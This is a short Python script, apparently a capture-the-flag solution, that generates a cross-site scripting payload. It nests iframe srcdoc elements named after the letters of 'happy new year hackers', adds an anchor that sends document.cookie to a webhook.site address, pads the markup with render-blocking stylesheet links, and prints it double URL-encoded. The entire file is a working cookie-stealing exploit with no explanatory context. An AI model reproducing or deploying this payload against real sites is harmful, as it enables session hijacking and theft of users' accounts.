import urllib.parse

s = 'h.a.p.p.y._.n.e.w._.y.e.a.r._.h.a.c.k.e.r.s'
s = s.split('.')
s.reverse()

def escape(v):
	return v.replace('&','&amp;').replace('"',"&quot;")
def genPayload():
	if(len(s) == 0):
		return ''
	c = s.pop()
	if(len(s) == 0):
		return f'<a id={c} href="tel:document.location=(`https://webhook.site/d2f4f35a-db9e-4339-b23e-8109b285c8a9?a=`+document.cookie)"></a>'
	return f'<iframe srcdoc="{escape(genPayload())}" name={c} ></iframe>'

s = genPayload()
for i in range(30):
	s += f'<link href=dd{i} blocking=rendering rel=stylesheet />'
print(urllib.parse.quote_plus(urllib.parse.quote_plus(s)))
# print(urllib.parse.quote_plus(s))
# print('s')

# print('<iframe srcdoc="A"></iframe>')
# escape('<iframe srcdoc=""></iframe>')

